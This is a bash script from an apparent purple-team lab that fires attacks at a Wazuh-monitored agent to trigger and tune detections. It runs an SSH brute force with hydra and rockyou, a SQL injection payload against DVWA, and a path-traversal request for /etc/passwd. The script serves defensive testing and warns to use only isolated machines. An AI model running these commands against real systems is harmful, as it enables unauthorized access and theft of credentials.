#!/usr/bin/env bash
#
# attack-simulations.sh
# Reproducible attack commands for the Wazuh Purple-Team Lab.
#
# Run from the ATTACKER host (Kali) against a lab AGENT you own, on an
# ISOLATED network. These intentionally trigger Wazuh detections so you can
# observe and tune them.
#
# Usage:
#   ./attack-simulations.sh <AGENT_IP>
#
# Example:
#   ./attack-simulations.sh 10.0.0.50
#
set -euo pipefail

AGENT_IP="${1:-}"
if [[ -z "${AGENT_IP}" ]]; then
  echo "Usage: $0 <AGENT_IP>"
  exit 1
fi

echo "[*] Target agent: ${AGENT_IP}"
echo "[*] Only run this against machines you own, in an isolated lab."
echo

# ─────────────────────────────────────────────────────────────
# 1. SSH brute force  ->  ATT&CK T1110
#    Expected detection: Wazuh rule 5712 (SSHD brute force, level 10)
# ─────────────────────────────────────────────────────────────
echo "[1] SSH brute force (T1110)…"
# rockyou.txt may be gzipped on a fresh Kali: sudo gunzip /usr/share/wordlists/rockyou.txt.gz
hydra -l fakeuser -P /usr/share/wordlists/rockyou.txt "ssh://${AGENT_IP}" -t 4 || true
echo

# ─────────────────────────────────────────────────────────────
# 2. SQL injection against DVWA  ->  ATT&CK T1190
#    Expected detection: Wazuh rule 31104 (Common web attack, level 6)
# ─────────────────────────────────────────────────────────────
echo "[2] SQL injection (T1190)…"
curl -s "http://${AGENT_IP}/dvwa/vulnerabilities/sqli/?id=1' OR '1'='1&Submit=Submit" >/dev/null || true
echo

# ─────────────────────────────────────────────────────────────
# 3. Path traversal to /etc/passwd  ->  ATT&CK T1083
#    Expected detection: built-in 31104 (level 6) AND custom rule 100100 (level 12)
# ─────────────────────────────────────────────────────────────
echo "[3] Path traversal to /etc/passwd (T1083)…"
curl -s "http://${AGENT_IP}/dvwa/vulnerabilities/fi/?page=../../../../etc/passwd" >/dev/null || true
echo

echo "[✓] Done. Check the Wazuh dashboard → Threat Hunting → Events."
echo "    Filter examples:  rule.id:5712   |   rule.groups:web   |   rule.id:100100"
